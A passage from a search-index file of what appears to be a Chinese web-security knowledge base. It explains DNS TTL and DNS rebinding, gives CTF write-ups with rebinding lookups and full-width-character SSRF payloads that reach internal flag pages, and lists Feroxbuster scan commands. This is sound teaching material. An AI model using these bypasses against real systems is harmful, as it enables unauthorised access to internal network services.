\u670d\u52a1\u5668\u4e2d\u7f13\u5b58\u7684\u65f6\u95f4\u52a0\u957f\uff0c\u8fd9\u6837\u5728\u66f4\u957f\u7684\u65f6\u95f4\u6bb5\u5185\uff0c\u6211\u4eec\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u7ad9\u65f6\uff0c\u672c\u5730 ISP \u7684 DNS \u670d\u52a1\u5668\u5c31\u4e0d\u9700\u8981\u5411\u57df\u540d\u7684 NS \u670d\u52a1\u5668\u53d1\u51fa\u89e3\u6790\u8bf7\u6c42\uff0c\u800c\u76f4\u63a5\u4ece\u672c\u5730\u7f13\u5b58\u4e2d\u8fd4\u56de\u57df\u540d\u89e3\u6790\u8bb0\u5f55, \u4ece\u800c\u63d0\u9ad8\u89e3\u6790\u6548\u7387\u3002 TTL \u503c\u662f\u4ee5\u79d2\u4e3a\u5355\u4f4d\u7684\uff0c\u901a\u5e38\u7684\u9ed8\u8ba4\u503c\u90fd\u662f 3600\uff0c\u4e5f\u5c31\u662f\u9ed8\u8ba4\u7f13\u5b58 1 \u5c0f\u65f6\u3002\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u9700\u8981\u628a TTL \u503c\u6269\u5927\uff0c\u4f8b\u5982\u8981\u7f13\u5b58\u4e00\u5929\u5c31\u8bbe\u7f6e\u6210 86400\u3002</p> <p>2. \u51cf\u5c0f TTL \u503c\uff0c\u51cf\u5c11\u66f4\u65b0\u57df\u540d\u8bb0\u5f55\u65f6\u7684\u4e0d\u53ef\u8bbf\u95ee\u65f6\u95f4</p> <p>\u66f4\u6362\u7a7a\u95f4\u56e0\u4e3a TTL \u7f13\u5b58\u7684\u95ee\u9898\uff0c\u65b0\u7684\u57df\u540d\u8bb0\u5f55\uff0c\u5728\u6709\u7684\u5730\u65b9\u53ef\u80fd\u751f\u6548\u4e86\uff0c\u6709\u7684\u5730\u65b9\u53ef\u80fd\u7b49\u4e0a\u4e00\u4e24\u5929\u751a\u81f3\u66f4\u4e45\u624d\u751f\u6548\u3002\u7ed3\u679c\u5c31\u662f\u6709\u7684\u4eba\u8bbf\u95ee\u5230\u4e86\u65b0\u670d\u52a1\u5668\uff0c\u6709\u7684\u4eba\u8bbf\u95ee\u5230\u4e86\u65e7\u670d\u52a1\u5668\u3002\u5982\u679c\u539f\u6765\u7684\u57df\u540d TTL \u503c\u8bbe\u7f6e\u7684\u5c0f\uff0c\u5404\u5730\u7684 ISP \u57df\u540d\u7f13\u5b58\u670d\u52a1\u5668\u670d\u52a1\u5668\u5c31\u4f1a\u5f88\u5feb\u7684\u8bbf\u95ee\u4f60\u57df\u540d\u7684\u6743\u5a01 DNS \u89e3\u6790\u670d\u52a1\u5668\uff0c\u5c3d\u5feb\u628a\u4f60\u57df\u540d\u7684 DNS \u89e3\u6790 IP \u8fd4\u56de\u7ed9\u67e5\u8be2\u8005\u3002</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#dns-rebinding","title":"DNS Rebinding","text":"<p>\u5728\u7f51\u9875\u6d4f\u89c8\u8fc7\u7a0b\u4e2d\uff0c\u7528\u6237\u5728\u5730\u5740\u680f\u4e2d\u8f93\u5165\u5305\u542b\u57df\u540d\u7684\u7f51\u5740\u3002\u6d4f\u89c8\u5668\u901a\u8fc7 DNS \u670d\u52a1\u5668\u5c06\u57df\u540d\u89e3\u6790\u4e3a IP \u5730\u5740\uff0c\u7136\u540e\u5411\u5bf9\u5e94\u7684 IP \u5730\u5740\u8bf7\u6c42\u8d44\u6e90\uff0c\u6700\u540e\u5c55\u73b0\u7ed9\u7528\u6237\u3002\u800c\u5bf9\u4e8e\u57df\u540d\u6240\u6709\u8005\uff0c\u4ed6\u53ef\u4ee5\u8bbe\u7f6e\u57df\u540d\u6240\u5bf9\u5e94\u7684 IP \u5730\u5740\u3002\u5f53\u7528\u6237\u7b2c\u4e00\u6b21\u8bbf\u95ee\uff0c\u89e3\u6790\u57df\u540d\u83b7\u53d6\u4e00\u4e2a IP \u5730\u5740\uff1b\u7136\u540e\uff0c\u57df\u540d\u6301\u6709\u8005\u4fee\u6539\u5bf9\u5e94\u7684 IP \u5730\u5740\uff1b\u7528\u6237\u518d\u6b21\u8bf7\u6c42\u8be5\u57df\u540d\uff0c\u5c31\u4f1a\u83b7\u53d6\u4e00\u4e2a\u65b0\u7684 IP \u5730\u5740\u3002\u5bf9\u4e8e\u6d4f\u89c8\u5668\u6765\u8bf4\uff0c\u6574\u4e2a\u8fc7\u7a0b\u8bbf\u95ee\u7684\u90fd\u662f\u540c\u4e00\u57df\u540d\uff0c\u6240\u4ee5\u8ba4\u4e3a\u662f\u5b89\u5168\u7684\u3002\u8fd9\u5c31\u9020\u6210\u4e86 DNS Rebinding \u653b\u51fb\u3002</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#_2","title":"\u5177\u4f53\u6b65\u9aa4","text":"<ol> <li>\u653b\u51fb\u8005\u63a7\u5236\u6076\u610f\u7684 DNS \u670d\u52a1\u5668\u6765\u56de\u590d\u57df\u7684\u67e5\u8be2, \u5982 rebind.network</li> <li>\u653b\u51fb\u8005\u901a\u8fc7\u4e00\u4e9b\u65b9\u5f0f\u8bf1\u5bfc\u53d7\u5bb3\u8005\u52a0\u8f7d http://rebind.network</li> <li>\u7528\u6237\u6253\u5f00\u94fe\u63a5, \u6d4f\u89c8\u5668\u5c31\u4f1a\u53d1\u51fa DNS \u8bf7\u6c42\u67e5\u627e rebind.network \u7684 IP \u5730\u5740</li> <li>\u6076\u610f DNS \u670d\u52a1\u5668\u6536\u5230\u53d7\u5bb3\u8005\u7684\u8bf7\u6c42, \u5e76\u4f7f\u7528\u771f\u5b9e IP \u5730\u5740\u8fdb\u884c\u54cd\u5e94, \u5e76\u5c06 TTL \u503c\u8bbe\u7f6e\u4e3a 1 \u79d2, \u8ba9\u53d7\u5bb3\u8005\u7684\u673a\u5668\u7f13\u5b58\u5f88\u5feb\u5931\u6548</li> <li>\u4ece http://rebind.network \u52a0\u8f7d\u7684\u7f51\u9875\u5305\u542b\u6076\u610f\u7684 js \u4ee3\u7801, \u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5230 http://rebind.network/index, \u800c\u53d7\u5bb3\u8005\u7684\u6d4f\u89c8\u5668\u4fbf\u5728\u6267\u884c\u6076\u610f\u8bf7\u6c42</li> <li>\u4e00\u5f00\u59cb\u7684\u6076\u610f\u8bf7\u6c42\u5f53\u7136\u662f\u53d1\u5230\u4e86\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668\u4e0a, \u4f46\u662f\u968f\u7740 TTL \u65f6\u95f4\u7ed3\u675f, \u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8ba9 http://rebind.network \u7ed1\u5b9a\u5230\u522b\u7684 IP, \u5982\u679c\u80fd\u6355\u83b7\u53d7\u5bb3\u8005\u7684\u4e00\u4e9b\u653e\u5728\u5185\u7f51\u7684\u5e94\u7528 IP \u5730\u5740, \u5c31\u53ef\u4ee5\u9488\u5bf9\u8fd9\u4e2a\u5185\u7f51\u5e94\u7528\u6784\u9020\u51fa\u5bf9\u5e94\u7684\u6076\u610f\u8bf7\u6c42, \u7136\u540e\u6d4f\u89c8\u5668\u6267\u884c\u7684\u6076\u610f\u8bf7\u6c42\u5c31\u53d1\u9001\u5230\u4e86\u5185\u7f51\u5e94\u7528, \u8fbe\u5230\u4e86\u653b\u51fb\u7684\u6548\u679c</li> </ol>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#_3","title":"\u540c\u6e90\u7b56\u7565\u7684\u5931\u6548","text":"<p>\u5bf9\u4e8e WEB \u7684\u540c\u6e90\u7b56\u7565\u76f8\u4fe1\u5927\u5bb6\u90fd\u5f88\u719f\u6089, \u5982\u679c\u4e24\u4e2a\u9875\u9762\u7684\u534f\u8bae\uff0c\u7aef\u53e3\uff08\u5982\u679c\u6709\u6307\u5b9a\uff09\u548c\u57df\u540d\u90fd\u76f8\u540c\uff0c\u5219\u4e24\u4e2a\u9875\u9762\u5177\u6709\u76f8\u540c\u7684\u6e90, \u800c\u4e0d\u540c\u6e90\u7684\u5ba2\u6237\u7aef\u811a\u672c\u5728\u6ca1\u6709\u660e\u786e\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u80fd\u8bfb\u5199\u5bf9\u65b9\u8d44\u6e90\u3002</p> <p>\u5f53\u7136, \u9875\u9762\u4e2d\u7684\u94fe\u63a5\uff0c\u91cd\u5b9a\u5411\u4ee5\u53ca\u8868\u5355\u63d0\u4ea4\u662f\u4e0d\u4f1a\u53d7\u5230\u540c\u6e90\u7b56\u7565\u9650\u5236\u7684, \u5e76\u4e14, \u8de8\u57df\u8d44\u6e90\u7684\u5f15\u5165\u662f\u53ef\u4ee5\u7684\u3002\u4f46\u662f js \u4e0d\u80fd\u8bfb\u5199\u52a0\u8f7d\u7684\u5185\u5bb9\u3002</p> <p>\u540c\u6e90\u7b56\u7565\u786e\u5b9e\u63d0\u9ad8\u4e86 web \u7684\u5b89\u5168\u6027, \u4f46\u662f\u5bf9\u4e8e DNS Rebinding \u6765\u8bf4\u662f\u6ca1\u6709\u4f5c\u7528\u7684, \u56e0\u4e3a\u540c\u6e90\u7b56\u7565\u770b\u7684\u662f\u57df\u540d, \u5e76\u4e0d\u662f\u80cc\u540e\u7684 IP \u5730\u5740, \u867d\u7136\u4e24\u6b21\u7684\u8bf7\u6c42 IP \u5730\u5740\u4e0d\u540c, \u4f46\u662f\u7531\u4e8e DNS \u670d\u52a1\u5668\u7684\u7ed1\u5b9a, \u57df\u540d\u90fd\u662f\u4e00\u6837\u7684, \u90a3\u4e48\u81ea\u7136\u4e0d\u8fdd\u53cd\u540c\u6e90\u7b56\u7565.</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#ctf","title":"CTF \u5b9e\u6218\u5e94\u7528","text":""},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#balsnctf2019","title":"balsnCTF2019 \u97e9\u56fd\u9c7c","text":"<p>\u672c\u9898\u7684\u4e00\u4e2a\u6b65\u9aa4\u4e5f\u6d89\u53ca\u5230\u4e86 DNS \u91cd\u7ed1\u5b9a\u7684\u5229\u7528, \u8fd9\u91cc\u5c31\u622a\u53d6\u90e8\u5206\u4ee3\u7801\u8bf4\u660e, \u5b8c\u6574\u7684 wp \u53ef\u4ee5\u67e5\u770b https://mp.weixin.qq.com/s/ToORsrR_1fh1gnnO2cM_VQ</p> <p>\u90e8\u5206\u6d89\u53ca\u5230\u7684\u4ee3\u7801</p> Text Only<pre><code>$dst = @$_GET['KR'];\n$res = @parse_url($dst);\n$ip = @dns_get_record($res['host'], DNS_A)[0]['ip'];\n...\n$dev_ip = \"54.87.54.87\";\nif($ip === $dev_ip) {\n    $content = file_get_contents($dst);\n    echo $content;\n}\n</code></pre> <p>\u5f88\u660e\u663e, \u9898\u76ee\u662f\u60f3\u5b9a\u6b7b\u6211\u4eec\u57df\u540d\u7684 ip \u4e3a 54.87.54.87, \u4f46\u662f\u8fd9\u6837\u5c31\u6ca1\u6cd5\u8bfb\u5230\u5185\u7f51\u7684\u4fe1\u606f\u4e86, \u5982\u679c\u6211\u4eec\u57df\u540d\u89e3\u6790\u7684 IP \u76f4\u63a5\u4e3a 127.0.0.1, \u90a3\u5c31\u65e0\u6cd5\u8fc7<code>$ip === $dev_ip</code>, \u63a5\u4e0b\u6765\u5c31\u5f97\u5229\u7528 DNS Rebinding</p> <p>\u8fd9\u662f\u4e00\u4e2a\u6d4b\u8bd5 dns \u91cd\u7ed1\u5b9a\u6f0f\u6d1e\u7684\u7f51\u7ad9, \u53ef\u4ee5\u8ba9\u4e00\u4e2a\u57df\u540d\u968f\u673a\u7684\u7ed1\u5b9a\u4e24\u4e2a IP https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</p> <p>\u8ba9\u6211\u4eec\u5728\u672c\u5730\u6d4b\u8bd5\u4e00\u4e0b\u5427</p> Text Only<pre><code>\u279c  ~ host 7f000001.36573657.rbndr.us\n7f000001.36573657.rbndr.us has address 127.0.0.1\n\u279c  ~ host 7f000001.36573657.rbndr.us\n7f000001.36573657.rbndr.us has address 127.0.0.1\n\u279c  ~ host 7f000001.36573657.rbndr.us\n7f000001.36573657.rbndr.us has address 54.87.54.87\n\u279c  ~ host 7f000001.36573657.rbndr.us\n7f000001.36573657.rbndr.us has address 54.87.54.87\n\u279c  ~ host 7f000001.36573657.rbndr.us\n7f000001.36573657.rbndr.us has address 54.87.54.87\n\u279c  ~ host 7f000001.36573657.rbndr.us\n7f000001.36573657.rbndr.us has address 54.87.54.87\n\u279c  ~ host 7f000001.36573657.rbndr.us\n7f000001.36573657.rbndr.us has address 127.0.0.1\n\u279c  ~ host 7f000001.36573657.rbndr.us\n7f000001.36573657.rbndr.us has address 127.0.0.1\n</code></pre> <p>\u6240\u4ee5\u601d\u8def\u5f88\u660e\u786e, \u5148\u8ba9 $ip \u4e3a 54.87.54.87, \u7136\u540e\u5728<code>file_get_contents</code>\u7684\u65f6\u5019\u6211\u4eec GET \u7684\u57df\u540d\u53c8\u7ed1\u5b9a\u5230 127.0.0.1, \u8fd9\u6837\u5c31\u7ed5\u8fc7\u4e86 if \u5224\u65ad\u8bed\u53e5, \u53ef\u4ee5\u8bfb\u5185\u7f51\u4fe1\u606f, \u5f53\u7136, \u7531\u4e8e\u662f\u968f\u673a\u7684, \u6240\u4ee5\u8981\u591a\u6253\u51e0\u6b21.</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#seccon-2019-web-option-cmd-u","title":"SECCON 2019 Web: Option-Cmd-U","text":"<p>\u9898\u76ee\u5730\u5740:http://ocu.chal.seccon.jp:10000/index.php</p> Text Only<pre><code>&lt;!-- src of this PHP script: /index.php?action=source --&gt;\n                    &lt;!-- the flag is in /flag.php, which permits access only from internal network :-) --&gt;\n                    &lt;!-- this service is running on php-fpm and nginx. see /docker-compose.yml --&gt;\n</code></pre> <p>\u6839\u636e\u6e90\u7801\u63d0\u793a, \u8bbf\u95ee<code>http://ocu.chal.seccon.jp:10000/index.php?action=source</code>\u8bfb\u53d6\u6e90\u7801, \u6211\u4eec\u91cd\u70b9\u770b PHP \u4ee3\u7801\u90e8\u5206</p> Text Only<pre><code>&lt;?php\nif (isset($_GET['url'])){\n    $url = filter_input(INPUT_GET, 'url');\n    $parsed_url = parse_url($url);                        \n    if($parsed_url[\"scheme\"] !== \"http\"){\n        // only http: should be allowed. \n        echo 'URL should start with http!';\n    } else if (gethostbyname(idn_to_ascii($parsed_url[\"host\"], 0, INTL_IDNA_VARIANT_UTS46)) === gethostbyname(\"nginx\")) {\n    // local access to nginx from php-fpm should be blocked.\n        echo 'Oops, are you a robot or an attacker?';\n    } else {\n    // file_get_contents needs idn_to_ascii(): https://stackoverflow.com/questions/40663425/\n        highlight_string(file_get_contents(idn_to_ascii($url, 0, INTL_IDNA_VARIANT_UTS46),\n               false,\n               stream_context_create(array(\n                   'http' =&gt; array(\n                       'follow_location' =&gt; false,\n                       'timeout' =&gt; 2\n                   )\n    ))));\n    }\n}\n?&gt;\n</code></pre> <p>\u6211\u4eec\u63d0\u4ea4<code>http://ocu.chal.seccon.jp:10000/flag.php</code>, \u8fd4\u56de<code>Forbidden.Your IP: 172.25.0.1</code>, \u770b\u6765\u6211\u4eec\u7684 ip \u88ab\u5b9a\u4e3a<code>172.25.0.1</code>, \u6839\u636e\u4ee3\u7801, \u6211\u4eec\u5f97\u5148\u77e5\u9053 nginx \u7684 ip, \u7b80\u5355 fuzz \u540e, \u63d0\u4ea4<code>http://172.25.0.3/flag.php</code>\u4f1a\u89e6\u53d1<code>Oops, are you a robot or an attacker?</code>, \u786e\u8ba4\u4e86 nginx \u7684 ip \u540e, \u8ddf\u4e0a\u9898\u4e00\u6837, \u6211\u4eec\u5728\u4e0a\u4e00\u9898\u7ed9\u51fa\u7684\u7f51\u7ad9\u6784\u9020\u57df\u540d, \u4e00\u4e2a\u586b<code>172.25.0.3</code>, \u53e6\u4e00\u4e2a IP \u5c31\u968f\u610f\u4e86, \u539f\u7406\u4e5f\u8ddf\u4e0a\u9898\u7c7b\u4f3c, \u5f53\u7136\u4e5f\u662f\u968f\u673a\u7684, \u591a\u70b9\u51e0\u6b21\u5c31\u8bbf\u95ee\u5230 flag \u4e86.</p> <p>\u5f53\u7136\u672c\u9898\u8fd8\u6709\u5176\u4ed6\u4e00\u4e9b\u6709\u8da3\u7684\u89e3\u6cd5, \u6bd4\u5982\u4ee5\u4e0b\u7684\u4e00\u4e9b payload \u90fd\u662f\u53ef\u4ee5\u7684</p> Text Only<pre><code>http://nginx\uff1a80/flag.php\nhttp://\uff20nginx/flag.php\nhttp://nginx\uff0fflag.php\n</code></pre> <p>\u5177\u4f53\u7684\u539f\u7406\u5927\u5bb6\u53ef\u4ee5\u53bb google \u5176\u4ed6\u4eba\u5199\u7684 wp</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#_4","title":"\u7ed3\u675f\u8bed","text":"<p>\u76ee\u524d\u6765\u770b\u5728 CTF \u4e2d\u51fa\u73b0\u7684 DNS Rebinding \u5229\u7528\u76f8\u5bf9\u6765\u8bf4\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684, \u4e5f\u53ef\u80fd\u662f\u6211\u505a\u9898\u505a\u7684\u4e0d\u591f\u591a\u6ca1\u6709\u9047\u5230\u66f4\u590d\u6742\u7684\u60c5\u51b5, \u7f51\u4e0a\u4e5f\u6709\u4e00\u4e9b\u8bb2\u8ff0\u5173\u4e8e\u5b9e\u6218\u7684\u6587\u7ae0, \u7531\u4e8e\u672c\u4eba\u6c34\u5e73\u6709\u9650, \u6682\u65f6\u8fd8\u6ca1\u8fdb\u884c\u8fc7\u5b9e\u6218\u7684\u5229\u7528, \u5982\u679c\u6587\u7ae0\u6709\u7eb0\u6f0f, \u8fd8\u8bf7\u5e08\u5085\u4eec\u7ea0\u6b63.</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#_5","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://bbs.pediy.com/thread-230047.htm </p> <p>\u58f0\u660e\uff1a\u7b14\u8005\u521d\u8877\u7528\u4e8e\u5206\u4eab\u4e0e\u666e\u53ca\u7f51\u7edc\u77e5\u8bc6\uff0c\u82e5\u8bfb\u8005\u56e0\u6b64\u4f5c\u51fa\u4efb\u4f55\u5371\u5bb3\u7f51\u7edc\u5b89\u5168\u884c\u4e3a\u540e\u679c\u81ea\u8d1f\uff0c\u4e0e\u5408\u5929\u667a\u6c47\u53ca\u539f\u4f5c\u8005\u65e0\u5173\uff01</p>"},{"location":"WEB/zhuan/Feroxbuster/","title":"Feroxbuster\u4f7f\u7528\u8bf4\u660e","text":"<p>\u539f\u6587\u94fe\u63a5\uff1a\u3010\u76ee\u5f55\u626b\u63cf\u3011feroxbuster v2.10.2 \u5b57\u5178\u6574\u5408\u7248</p> <p>Feroxbuster \u662f\u4e00\u6b3e\u5f3a\u5927\u7684\u76ee\u5f55\u626b\u63cf\u5de5\u5177\uff0cFeroxbuster \u7684\u4e3b\u8981\u529f\u80fd\u662f\u57fa\u4e8e\u5b57\u5178\u7684\u76ee\u5f55\u626b\u63cf\uff0c\u5e76\u4e14\u9ed8\u8ba4\u4f7f\u7528 Seclists \u5b57\u5178\u8fdb\u884c\u4f7f\u7528\uff01\u5e76\u4e14\u5177\u6709\u5feb\u901f\u548c\u9ad8\u6548\u7684\u7279\u70b9\uff0c\u91c7\u7528\u4e86\u591a\u7ebf\u7a0b\u7684\u6280\u672f\u6765\u52a0\u5feb\u626b\u63cf\u901f\u5ea6\u3002\u8fd8\u652f\u6301\u6682\u505c\u4ea4\u4e92\u5f0f\u8bbe\u7f6e\u7b49\uff01</p> <p>\u5b98\u65b9\u6587\u6863\uff1aferoxbuster\u00a0 Documentation</p>"},{"location":"WEB/zhuan/Feroxbuster/#_1","title":"\u5feb\u901f\u4f7f\u7528","text":"<p>\u6ce8\u610f\u4e8b\u9879</p> <p>1\u3001\u626b\u63cf\u65f6\u6ce8\u610f\u662f\u626b\u63cf\u76ee\u5f55\u8fd8\u662f\u6587\u4ef6\uff0c\u9ed8\u8ba4\u626b\u63cf\u76ee\u5f55\u3002 2\u3001\u9ed8\u8ba4\u53c2\u6570\u7684\u626b\u63cf\u7ebf\u7a0b\u6bd4\u8f83\u66b4\u529b\uff0c\u5efa\u8bae\u624b\u52a8\u8c03\u6574\u7ebf\u7a0b\uff08\u4e0d\u61c2\u76f4\u63a5\u4f7f\u7528\u672c\u6587\u7684\u4f18\u5316\u53c2\u6570\uff09</p> <ul> <li>\u5b98\u65b9\u6587\u6863\uff1aDocumentation</li> <li>\u7528\u9ed8\u8ba4\u53c2\u6570\u626b\u63cf\u76ee\u6807<code>&lt;url&gt;</code>\uff0c\u4e14<code>\u4ec5\u626b\u63cf\u76ee\u5f55</code></li> </ul> Text Only<pre><code>feroxbuster --url &lt;url&gt;\n</code></pre> <ul> <li>\u9650\u5236\u540c\u65f6\u626b\u63cf\u4e24\u4e2a\u76ee\u5f55\uff0c\u7ebf\u7a0b 20\uff0c\u6392\u9664\u72b6\u6001\u7801 404\uff0c \u626b\u63cf\u76ee\u6807<code>&lt;url&gt;</code>\u4e14<code>\u4ec5\u626b\u63cf\u76ee\u5f55</code></li> </ul> Text Only<pre><code>feroxbuster --scan-limit 2 -t 20 --filter-status 404 --url &lt;url&gt;\n</code></pre> <ul> <li>\u3010ASP.NET\u3011\u7528\u9ed8\u8ba4\u53c2\u6570\u626b\u63cf\u76ee\u6807\uff0c<code>\u4e14\u626b\u63cf\u76ee\u5f55\u548chtml,asp,aspx,ashx,asmx\u6587\u4ef6\u540e\u7f00</code></li> </ul> Text Only<pre><code>feroxbuster -x html,asp,aspx,ashx,asmx --url &lt;url&gt;\n</code></pre> <ul> <li>\u3010JAVA\u3011\u7528\u9ed8\u8ba4\u53c2\u6570\u626b\u63cf\u76ee\u6807\uff0c<code>\u4e14\u626b\u63cf\u76ee\u5f55\u548chtml,htm,jsp\u6587\u4ef6\u540e\u7f00</code></li> </ul> Text Only<pre><code>feroxbuster -x html,htm,jsp --url &lt;url&gt;\n</code></pre> <ul> <li>\u3010PHP\u3011\u7528\u9ed8\u8ba4\u53c2\u6570\u626b\u63cf\u76ee\u6807\uff0c<code>\u4e14\u626b\u63cf\u76ee\u5f55\u548chtml,PHP\u6587\u4ef6\u540e\u7f00</code></li> </ul> Text Only<pre><code>feroxbuster -x html,php --url &lt;url&gt;\n</code></pre> <ul> <li>\u9ed8\u8ba4\u6dfb\u52a0\u4e86 SecLists \u5b57\u5178\uff0c\u65e0\u9700\u624b\u52a8\u6dfb\u52a0\uff0c\u5f00\u7bb1\u5373\u7528\uff01</li> <li>Linux \u7248\u672c\u5728\u9996\u6b21\u8fd0\u884c\u3001\u66f4\u65b0\u540e\uff0c\u9700\u8981\u6267\u884c install.sh \u811a\u672c\uff1a<code>bash install.sh</code></li> <li>\u6dfb\u52a0\u4e86\u63d0\u793a Windows \u7684\u547d\u4ee4\u63d0\u793a\u811a\u672c\uff01\u6267\u884c\u547d\u4ee4 start.bat \u5373\u53ef\u67e5\u770b\uff01</li> </ul>"},{"location":"WEB/zhuan/HTTP%E6%8A%A5%E6%96%87/","title":"HTTP \u62a5\u6587","text":""},{"location":"WEB/zhuan/HTTP%E6%8A%A5%E6%96%87/#http_1","title":"HTTP \u534f\u8bae\u8bf7\u6c42\u5934","text":"\u540d\u79f0 \u540d\u79f0 ==Accept== \u6307\u5b9a\u5ba2\u6237\u7aef\u80fd\u591f\u63a5\u6536\u7684\u5185\u5bb9\u7c7b\u578b Accept-Charset Accept-Charset ==Accept-Encoding== \u6307\u5b9a\u6d4f\u89c8\u5668\u53ef\u4ee5\u652f\u6301\u7684web\u670d\u52a1\u5668\u8fd4\u56de\u5185\u5bb9\u538b\u7f29\u7f16\u7801\u7c7b\u578b ==Accept-Language== \u6d4f\u89c8\u5668\u53ef\u63a5\u53d7\u7684\u8bed\u8a00 Accept-Ranges \u53ef\u4ee5\u8bf7\u6c42\u7f51\u9875\u5b9e\u4f53\u7684\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u5b50\u8303\u56f4\u5b57\u6bb5 AuthorizationHTTP \u6388\u6743\u7684\u6388\u6743\u8bc1\u4e66 Cache-Control \u6307\u5b9a\u8bf7\u6c42\u548c\u54cd\u5e94\u9075\u5faa\u7684\u7f13\u5b58\u673a\u5236 ==Connection== \u8868\u793a\u662f\u5426\u9700\u8981\u6301\u4e45\u8fde\u63a5\u3002\uff08HTTP 1.1\u9ed8\u8ba4\u8fdb\u884c\u6301\u4e45\u8fde\u63a5\uff09 ==Cookie== \u8868\u793a\u670d\u52a1\u7aef\u7ed9\u5ba2\u6237\u7aef\u4f20\u7684http\u8bf7\u6c42\u72b6\u6001,\u4e5f\u662f\u591a\u4e2akey=value\u5f62\u5f0f\u7ec4\u5408\uff0c\u6bd4\u5982\u767b\u5f55\u540e\u7684\u4ee4\u724c\u7b49 CookieHTTP \u8bf7\u6c42\u53d1\u9001\u65f6\uff0c\u4f1a\u628a\u4fdd\u5b58\u5728\u8be5\u8bf7\u6c42\u57df\u540d\u4e0b\u7684\u6240\u6709cookie\u503c\u4e00\u8d77\u53d1\u9001\u7ed9web\u670d\u52a1\u5668 ==Content-Length== \u8bf7\u6c42\u7684\u5185\u5bb9\u957f\u5ea6 ==Content-Type== \u8bf7\u6c42\u7684\u4e0e\u5b9e\u4f53\u5bf9\u5e94\u7684MIME\u4fe1\u606f Date \u8bf7\u6c42\u53d1\u9001\u7684\u65e5\u671f\u548c\u65f6\u95f4 Expect \u8bf7\u6c42\u7684\u7279\u5b9a\u7684\u670d\u52a1\u5668\u884c\u4e3a From \u53d1\u51fa\u8bf7\u6c42\u7684\u7528\u6237\u7684Email ==Host== \u6307\u5b9a\u8bf7\u6c42\u7684\u670d\u52a1\u5668\u7684\u57df\u540d\u548c\u7aef\u53e3\u53f7 If-Match \u53ea\u6709\u8bf7\u6c42\u5185\u5bb9\u4e0e\u5b9e\u4f53\u76f8\u5339\u914d\u624d\u6709\u6548 If-Modified-Since \u5982\u679c\u8bf7\u6c42\u7684\u90e8\u5206\u5728\u6307\u5b9a\u65f6\u95f4\u4e4b\u540e\u88ab\u4fee\u6539\u5219\u8bf7\u6c42\u6210\u529f\uff0c\u672a\u88ab\u4fee\u6539\u5219\u8fd4\u56de304\u4ee3\u7801 If-None-Match \u5982\u679c\u5185\u5bb9\u672a\u6539\u53d8\u8fd4\u56de304\u4ee3\u7801\uff0c\u53c2\u6570\u4e3a\u670d\u52a1\u5668\u5148\u524d\u53d1\u9001\u7684Etag\uff0c\u4e0e\u670d\u52a1\u5668\u56de\u5e94\u7684Etag\u6bd4\u8f83\u5224\u65ad\u662f\u5426\u6539\u53d8 If-Range \u5982\u679c\u5b9e\u4f53\u672a\u6539\u53d8\uff0c\u670d\u52a1\u5668\u53d1\u9001\u5ba2\u6237\u7aef\u4e22\u5931\u7684\u90e8\u5206\uff0c\u5426\u5219\u53d1\u9001\u6574\u4e2a\u5b9e\u4f53 If-Unmodified-Since \u53ea\u5728\u5b9e\u4f53\u5728\u6307\u5b9a\u65f6\u95f4\u4e4b\u540e\u672a\u88ab\u4fee\u6539\u624d\u8bf7\u6c42\u6210\u529f Max-Forwards \u9650\u5236\u4fe1\u606f\u901a\u8fc7\u4ee3\u7406\u548c\u7f51\u5173\u4f20\u9001\u7684\u65f6\u95f4 ==Origin== \u544a\u8bc9\u670d\u52a1\u5668\u8bf7\u6c42\u4ece\u54ea\u91cc\u53d1\u8d77\u7684\uff0c\u4ec5\u5305\u62ec\u534f\u8bae\u548c\u57df\u540d CORS\u8de8\u57df\u8bf7\u6c42\u4e2d\u53ef\u4ee5\u770b\u5230response\u6709\u5bf9\u5e94\u7684header\uff0cAccess-Control-Allow-Origin Pragma \u7528\u6765\u5305\u542b\u5b9e\u73b0\u7279\u5b9a\u7684\u6307\u4ee4 Proxy-Authorization \u8fde\u63a5\u5230\u4ee3\u7406\u7684\u6388\u6743\u8bc1\u4e66 Range \u53ea\u8bf7\u6c42\u5b9e\u4f53\u7684\u4e00\u90e8\u5206\uff0c\u6307\u5b9a\u8303\u56f4 ==Referer== \u5148\u524d\u7f51\u9875\u7684\u5730\u5740\uff0c\u5f53\u524d\u8bf7\u6c42\u7f51\u9875\u7d27\u968f\u5176\u540e,\u5373\u6765\u8def TE \u5ba2\u6237\u7aef\u613f\u610f\u63a5\u53d7\u7684\u4f20\u8f93\u7f16\u7801\uff0c\u5e76\u901a\u77e5\u670d\u52a1\u5668\u63a5\u53d7\u63a5\u53d7\u5c3e\u52a0\u5934\u4fe1\u606f Upgrade \u5411\u670d\u52a1\u5668\u6307\u5b9a\u67d0\u79cd\u4f20\u8f93\u534f\u8bae\u4ee5\u4fbf\u670d\u52a1\u5668\u8fdb\u884c\u8f6c\u6362 ==User-Agent== \u8bf7\u6c42\u7684\u7528\u6237\u4fe1\u606f Via 